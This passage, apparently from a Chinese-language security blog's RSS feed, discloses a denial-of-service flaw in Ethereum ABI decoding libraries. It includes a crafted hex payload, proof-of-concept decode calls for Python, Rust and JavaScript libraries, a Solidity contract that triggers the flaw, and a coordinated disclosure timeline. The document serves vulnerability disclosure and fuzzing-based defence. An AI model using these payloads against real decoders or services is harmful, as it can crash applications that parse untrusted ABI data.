&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0000000000000000000000000000000000000000000000000000000000000020
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000000000000000000000000000000000000000000000000000000FFFFFFFF
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;该载荷包含两个32字节块，描述序列化的ZST数组。第一块定义数组元素偏移量，第二块定义数组长度。我们使用&lt;code&gt;()[ ]&lt;/code&gt;和&lt;code&gt;uint32[0][]&lt;/code&gt;两种ABI模式进行解码测试。&lt;/p&gt;
&lt;h3 id=&#34;eth_abi-python&#34;&gt;eth_abi (Python)
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;eth_abi&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;bytearray&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fromhex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;()[]&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;4.2.0版本前的官方库会先挂起，最终因内存不足终止。&lt;/p&gt;
&lt;h3 id=&#34;ethabi-rust&#34;&gt;ethabi (Rust)
&lt;/h3&gt;&lt;p&gt;v18.0.0版本可通过CLI直接触发漏洞：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cargo run -- decode params -t &lt;span class=&#34;s2&#34;&gt;&amp;#34;uint32[0][]&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$payload&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;ethers-rs-rust&#34;&gt;ethers-rs (Rust)
&lt;/h3&gt;&lt;p&gt;v2.0.10版本通过&lt;code&gt;Vec&amp;lt;[u32; 0]&amp;gt;&lt;/code&gt;类型隐式使用漏洞模式：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ethers&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;abi&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;AbiEncode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hex&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Vec&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;u32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hex_output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;unwrap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()).&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;unwrap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;foundry-rust&#34;&gt;foundry (Rust)
&lt;/h3&gt;&lt;p&gt;该工具集基于ethers-rs，同样存在漏洞。可通过CLI或部署恶意合约触发：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;contract&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;ABC&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;fallback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;external&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kt&#34;&gt;bytes&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;memory&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;abi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xfffffffff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;assembly&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nf&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;mload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;alloy-rs&#34;&gt;alloy-rs
&lt;/h3&gt;&lt;p&gt;0.4.2版本的动态ABI解析同样存在挂起问题：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;alloy_dyn_abi&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DynSolType&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DynSolValue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;my_type&lt;/span&gt;: &lt;span class=&#34;nc&#34;&gt;DynSolType&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;()[]&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;parse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;unwrap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decoded&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;my_type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;abi_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hex&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;$payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;unwrap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()).&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;unwrap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;ethereumjs-abi&#34;&gt;ethereumjs-abi
&lt;/h3&gt;&lt;p&gt;0.6.8版本的JavaScript实现也受影响：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;abi&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ethereumjs-abi&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;$payload&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;, &amp;#34;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;abi.rawDecode([ &amp;#34;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;uint32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;漏洞发现与利用&#34;&gt;漏洞发现与利用
&lt;/h2&gt;&lt;p&gt;该漏洞的发现源于对borsh-rs库中类似问题的研究。最新版Solidity和Vyper已禁止ZST定义，因此难以在主网部署触发此漏洞的智能合约。但任何使用受影响库解析不可信ABI声明的应用（如Etherscan）都可能面临风险。&lt;/p&gt;
&lt;h2 id=&#34;协调披露&#34;&gt;协调披露
&lt;/h2&gt;&lt;p&gt;我们遵循以下时间线进行披露：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2023年6月30日：首次联系各库维护者&lt;/li&gt;
&lt;li&gt;2023年8月2日：为eth_abi创建GitHub安全公告&lt;/li&gt;
&lt;li&gt;2023年8月31日：eth_abi发布无公开说明的修复&lt;/li&gt;
&lt;li&gt;2023年12月29日：公开发布分析报告并创建GitHub问题&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;建议开发者通过模糊测试强化解码器安全性，我们正将相关测试用例纳入OSS-fuzz持续检测体系。&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
